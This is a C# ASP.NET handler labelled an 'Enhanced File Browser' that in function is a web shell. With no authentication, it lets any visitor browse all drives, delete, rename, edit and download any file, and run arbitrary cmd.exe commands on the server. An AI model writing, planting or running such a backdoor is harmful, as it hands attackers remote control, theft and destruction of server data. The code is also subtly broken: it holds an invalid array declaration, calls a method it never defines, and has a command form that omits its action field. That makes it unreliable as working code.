<%@ WebHandler Language="C#" Class="EnhancedBrowserCorrected" %>
using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Web;

public class EnhancedBrowserCorrected : IHttpHandler
{
    private const string DefaultPath = @"C:\"; // Adjust this for your environment

    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/html; charset=utf-8";

        string action = context.Request["action"] ?? "";
        string inputPath = context.Request["path"] ?? "";

        string currentPath = ValidatePath(inputPath);

        StringBuilder sb = new StringBuilder();

        // Start HTML + head + styles
        sb.AppendLine("<!DOCTYPE html>");
        sb.AppendLine("<html><head><title>Enhanced File Browser</title>");
        sb.AppendLine("<style>");
        sb.AppendLine("body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }");
        sb.AppendLine("nav { margin-bottom: 20px; }");
        sb.AppendLine("nav a { margin-right: 15px; cursor: pointer; font-weight: bold; text-decoration: none; }");
        sb.AppendLine("nav a:hover { text-decoration: underline; }");
        sb.AppendLine("table { width: 100%; border-collapse: collapse; }");
        sb.AppendLine("th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }");
        sb.AppendLine("tr:hover { background-color: #efefef; }");
        sb.AppendLine(".button { margin: 2px; padding: 5px 10px; cursor: pointer; }");
        sb.AppendLine(".error { color: red; }");
        sb.AppendLine(".success { color: green; }");
        sb.AppendLine(".tab { display: none; }");
        sb.AppendLine(".tab.active { display: block; }");
        sb.AppendLine("#drivesList { padding: 10px; background: #f9f9f9; border: 1px solid #ccc; margin-bottom: 15px; }");
        sb.AppendLine("#drivesList a { font-weight: bold; margin-right: 15px; }");
        sb.AppendLine(".back-link { font-weight: bold; margin-bottom: 10px; display: inline-block; }");
        sb.AppendLine("</style>");

        // JavaScript section
        sb.AppendLine("<script>");
        sb.AppendLine("function showTab(id) {");
        sb.AppendLine("  var tabs = document.getElementsByClassName('tab');");
        sb.AppendLine("  for (var i=0; i < tabs.length; i++) { tabs[i].classList.remove('active'); }");
        sb.AppendLine("  document.getElementById(id).classList.add('active');");
        sb.AppendLine("}");
        sb.AppendLine("function toggleDrives() {");
        sb.AppendLine("  var elem = document.getElementById('drivesList');");
        sb.AppendLine("  if (elem.style.display === 'none' || elem.style.display === '') elem.style.display = 'block'; else elem.style.display = 'none';");
        sb.AppendLine("}");
        sb.AppendLine("function confirmDelete(path) {");
        sb.AppendLine("  if(confirm('Are you sure you want to delete: ' + path + '?')) { window.location = '?action=delete&path=' + encodeURIComponent(path); }");
        sb.AppendLine("}");
        sb.AppendLine("function renameItem(path) {");
        sb.AppendLine("  var newName = prompt('Enter new name:', '');");
        sb.AppendLine("  if(newName) { window.location = '?action=rename&path=' + encodeURIComponent(path) + '&newname=' + encodeURIComponent(newName); }");
        sb.AppendLine("}");
        sb.AppendLine("function editFile(path) {");
        sb.AppendLine("  window.location = '?action=editform&path=' + encodeURIComponent(path);");
        sb.AppendLine("}");
        sb.AppendLine("function executeCmd(event) {");
        sb.AppendLine("  event.preventDefault();");
        sb.AppendLine("  var form = event.target;");
        sb.AppendLine("  var xhr = new XMLHttpRequest();");
        sb.AppendLine("  var formData = new FormData(form);");
        sb.AppendLine("  xhr.open('POST', form.action, true);");
        sb.AppendLine("  xhr.onload = function() {");
        sb.AppendLine("    if(xhr.status === 200) {");
        sb.AppendLine("      document.getElementById('cmdOutput').innerHTML = '<pre style=\"background:#eee;padding:10px;\">' + xhr.responseText.replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</pre>';");
        sb.AppendLine("    }");
        sb.AppendLine("  };");
        sb.AppendLine("  xhr.send(formData);");
        sb.AppendLine("}");
        sb.AppendLine("</script>");

        sb.AppendLine("</head><body>");

        // Drives list and toggle button
        sb.AppendLine("<button onclick='toggleDrives()' style='margin-bottom: 10px;'>Toggle Drives</button>");
        sb.AppendLine("<div id='drivesList' style='display: none;'>");
        try
        {
            string[] drives = Environment.GetLogicalDrives();
            foreach (var drive in drives)
            {
                string urlEncoded = HttpUtility.UrlEncode(drive);
                sb.AppendFormat("<a href='?path={0}'>{1}</a>", urlEncoded, drive);
            }
        }
        catch { }
        sb.AppendLine("</div>");

        sb.AppendLine("<nav>");
        sb.AppendLine("<a onclick=\"showTab('browseTab')\">Browse</a> | ");
        sb.AppendLine("<a onclick=\"showTab('cmdTab')\">Command</a>");
        sb.AppendLine("</nav>");

        string message = ProcessAction(context, action, out currentPath);
        if (!string.IsNullOrEmpty(message))
        {
            sb.AppendFormat("<p>{0}</p>", message);
        }

        sb.AppendFormat("<div class='tab active' id='browseTab'>{0}</div>", RenderBrowser(context, currentPath));
        sb.AppendFormat("<div class='tab' id='cmdTab'>{0}</div>", RenderCommand(context));

        sb.AppendLine("</body></html>");

        context.Response.Write(sb.ToString());
    }

    private string ProcessAction(HttpContext context, string action, out string currentPath)
    {
        currentPath = ValidatePath(context.Request["path"]);

        if (string.IsNullOrEmpty(action))
            return null;

        try
        {
            switch (action.ToLowerInvariant())
            {
                case "delete":
                    {
                        string pathToDelete = context.Request["path"];
                        if (string.IsNullOrWhiteSpace(pathToDelete))
                            return "<p class='error'>Delete action missing path.</p>";

                        if (File.Exists(pathToDelete))
                        {
                            File.Delete(pathToDelete);
                            return $"<p class='success'>Deleted file: {HttpUtility.HtmlEncode(pathToDelete)}</p>";
                        }
                        else if (Directory.Exists(pathToDelete))
                        {
                            Directory.Delete(pathToDelete, true);
                            return $"<p class='success'>Deleted folder: {HttpUtility.HtmlEncode(pathToDelete)}</p>";
                        }
                        else return $"<p class='error'>Path not found: {HttpUtility.HtmlEncode(pathToDelete)}</p>";
                    }
                case "rename":
                    {
                        string pathToRename = context.Request["path"];
                        string newName = context.Request["newname"];
                        if (string.IsNullOrWhiteSpace(pathToRename) || string.IsNullOrWhiteSpace(newName))
                            return "<p class='error'>Rename action missing parameters.</p>";

                        string newFullPath = Path.Combine(Path.GetDirectoryName(pathToRename), newName);
                        if (File.Exists(pathToRename))
                        {
                            File.Move(pathToRename, newFullPath);
                            currentPath = Path.GetDirectoryName(newFullPath);
                            return $"<p class='success'>Renamed file to: {HttpUtility.HtmlEncode(newName)}</p>";
                        }
                        else if (Directory.Exists(pathToRename))
                        {
                            Directory.Move(pathToRename, newFullPath);
                            currentPath = Path.GetDirectoryName(newFullPath);
                            return $"<p class='success'>Renamed folder to: {HttpUtility.HtmlEncode(newName)}</p>";
                        }
                        else return "<p class='error'>Path for renaming not found.</p>";
                    }
                case "editform":
                    return null; // Handled in UI Generation
                case "saveedit":
                    {
                        string fileEditPath = context.Request["path"];
                        if (string.IsNullOrWhiteSpace(fileEditPath))
                            return "<p class='error'>Save edit missing path.</p>";
                        if (!File.Exists(fileEditPath))
                            return "<p class='error'>File not found to save.</p>";

                        string content = context.Request.Form["filecontent"] ?? "";
                        File.WriteAllText(fileEditPath, content);
                        currentPath = Path.GetDirectoryName(fileEditPath);
                        return $"<p class='success'>File saved: {HttpUtility.HtmlEncode(fileEditPath)}</p>";
                    }
                case "newfolder":
                    {
                        string newFolderName = context.Request["foldername"];
                        if (string.IsNullOrWhiteSpace(newFolderName))
                            return "<p class='error'>New folder name missing.</p>";

                        string newFolderPath = Path.Combine(currentPath, newFolderName);
                        if (Directory.Exists(newFolderPath))
                            return "<p class='error'>Folder already exists.</p>";

                        Directory.CreateDirectory(newFolderPath);
                        return $"<p class='success'>Folder created: {HttpUtility.HtmlEncode(newFolderName)}</p>";
                    }
                case "cmdexec":
                    return null; // Handled in UI generation
                case "download":
                    {
                        string fileToDownload = context.Request["path"];
                        if (string.IsNullOrWhiteSpace(fileToDownload) || !File.Exists(fileToDownload))
                            return "<p class='error'>File not found for download.</p>";

                        HttpResponse resp = context.Response;
                        resp.Clear();
                        resp.ContentType = "application/octet-stream";
                        resp.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(fileToDownload));
                        resp.TransmitFile(fileToDownload);
                        resp.End();
                        return null;
                    }
                default:
                    return null;
            }
        }
        catch (Exception ex)
        {
            return $"<p class='error'>Error: {HttpUtility.HtmlEncode(ex.Message)}</p>";
        }
    }

    private string RenderBrowser(HttpContext context, string currentPath)
    {
        StringBuilder sb = new StringBuilder();

        sb.AppendFormat("<h2>Current Path: {0}</h2>", HttpUtility.HtmlEncode(currentPath));

        var parent = Directory.GetParent(currentPath);
        if (parent != null)
        {
            sb.AppendFormat("<a href='?path={0}' class='back-link'>&larr; Back to {1}</a><br/><br/>",
                            HttpUtility.UrlEncode(parent.FullName),
                            HttpUtility.HtmlEncode(parent.FullName));
        }

        // Display drives toggle (redundant with global but included for clarity)
        sb.AppendLine("<p><strong>Drives:</strong></p><ul style='list-style:none;padding-left:0;'>");
        try
        {
            foreach (var drive in Environment.GetLogicalDrives())
            {
                sb.AppendFormat("<li style='display:inline-block;margin-right:10px;'><a href='?path={0}'>{1}</a></li>", HttpUtility.UrlEncode(drive), drive);
            }
        }
        catch { }
        sb.AppendLine("</ul><hr/>");

        // New folder creation form
        sb.AppendFormat(@"
            <form method='get'>
                <input type='hidden' name='action' value='newfolder' />
                <input type='hidden' name='path' value='{0}' />
                New Folder: <input type='text' name='foldername' required />
                <input type='submit' value='Create' />
            </form>
            <hr/>", HttpUtility.HtmlEncode(currentPath));

        sb.AppendLine("<table><thead><tr><th>Name</th><th>Size</th><th>Last Modified</th><th>Actions</th></tr></thead><tbody>");

        string[] directories = new string[0];
        string[] files = new string;
        try
        {
            directories = Directory.GetDirectories(currentPath);
            files = Directory.GetFiles(currentPath);
        }
        catch (Exception ex)
        {
            sb.AppendFormat("<tr><td colspan='4' class='error'>Error reading directory: {0}</td></tr>", HttpUtility.HtmlEncode(ex.Message));
        }

        foreach (var dir in directories)
        {
            var di = new DirectoryInfo(dir);
            sb.AppendLine("<tr>");
            sb.AppendFormat("<td><a href='?path={0}'><strong>{1}</strong></a></td>", HttpUtility.UrlEncode(dir), HttpUtility.HtmlEncode(di.Name));
            sb.Append("<td>--</td>");
            sb.AppendFormat("<td>{0}</td>", di.LastWriteTime);
            sb.AppendFormat("<td><button class='button' onclick=\"renameItem('{0}')\">Rename</button> <button class='button' onclick=\"confirmDelete('{0}')\">Delete</button></td>",
                            HttpUtility.JavaScriptStringEncode(dir));
            sb.AppendLine("</tr>");
        }

        foreach (var file in files)
        {
            var fi = new FileInfo(file);
            sb.AppendLine("<tr>");
            sb.AppendFormat("<td><a href='?path={0}&action=editform'>{1}</a></td>", HttpUtility.UrlEncode(file), HttpUtility.HtmlEncode(fi.Name));
            sb.AppendFormat("<td>{0}</td>", FormatSize(fi.Length));
            sb.AppendFormat("<td>{0}</td>", fi.LastWriteTime);
            sb.AppendFormat("<td><a class='button' href='?path={0}&action=download'>Download</a> <button class='button' onclick=\"renameItem('{1}')\">Rename</button> <button class='button' onclick=\"confirmDelete('{1}')\">Delete</button> <button class='button' onclick=\"editFile('{1}')\">Edit</button></td>",
                            HttpUtility.UrlEncode(file),
                            HttpUtility.JavaScriptStringEncode(file));
            sb.AppendLine("</tr>");
        }

        sb.AppendLine("</tbody></table>");

        if ((context.Request["action"] ?? "").ToLower() == "editform")
        {
            string editPath = context.Request["path"];
            if (!string.IsNullOrWhiteSpace(editPath) && File.Exists(editPath))
            {
                string content = File.ReadAllText(editPath);
                sb.AppendFormat("<hr/><h3>Editing File: {0}</h3>", HttpUtility.HtmlEncode(editPath));
                sb.AppendLine("<form method='post'>");
                sb.AppendFormat("<input type='hidden' name='action' value='saveedit' />");
                sb.AppendFormat("<input type='hidden' name='path' value='{0}' />", HttpUtility.HtmlEncode(editPath));
                sb.AppendFormat("<textarea name='filecontent' rows='20' cols='100' style='width:100%; font-family: monospace;'>");
                sb.Append(HttpUtility.HtmlEncode(content));
                sb.AppendLine("</textarea>");
                sb.AppendLine("<br/><input type='submit' value='Save' />");
                sb.AppendLine("</form>");
            }
            else
            {
                sb.AppendLine("<p class='error'>File not found for editing.</p>");
            }
        }
        return sb.ToString();
    }

    private string RenderCommand(HttpContext context)
    {
        StringBuilder sb = new StringBuilder();
        sb.AppendLine("<h2>Command Execution</h2>");
        sb.AppendLine("<form method='post' onsubmit='executeCmd(event)' action=''>");
        sb.AppendLine("<textarea name='cmdtext' rows='10' cols='80' placeholder='Enter command...' style='width:100%; font-family: monospace;'></textarea>");
        sb.AppendLine("<br/><input type='submit' value='Run Command' />");
        sb.AppendLine("</form>");
        sb.AppendLine("<div id='cmdOutput'>");

        if ((context.Request.HttpMethod ?? "").ToUpper() == "POST" && (context.Request["action"] ?? "").ToLower() == "cmdexec")
        {
            string cmd = context.Request.Form["cmdtext"] ?? "";
            if (!string.IsNullOrEmpty(cmd))
            {
                string output = ExecuteCmd(cmd);
                sb.AppendFormat("<pre style='background:#eee; padding:10px;'>{0}</pre>", HttpUtility.HtmlEncode(output));
            }
        }

        sb.AppendLine("</div>");
        return sb.ToString();
    }

    private string ExecuteCmd(string command)
    {
        try
        {
            var psi = new ProcessStartInfo("cmd.exe", "/c " + command)
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using (Process proc = Process.Start(psi))
            {
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                proc.WaitForExit();
                return output + (string.IsNullOrEmpty(error) ? "" : "\nERROR:\n" + error);
            }
        }
        catch (Exception ex)
        {
            return "Command execution failed: " + ex.Message;
        }
    }

    private string FormatSize(long bytes)
    {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return (bytes / 1024.0).ToString("0.0") + " KB";
        if (bytes < 1024 * 1024 * 1024) return (bytes / (1024.0 * 1024)).ToString("0.0") + " MB";
        return (bytes / (1024.0 * 1024 * 1024)).ToString("0.0") + " GB";
    }

    public bool IsReusable => false;
}
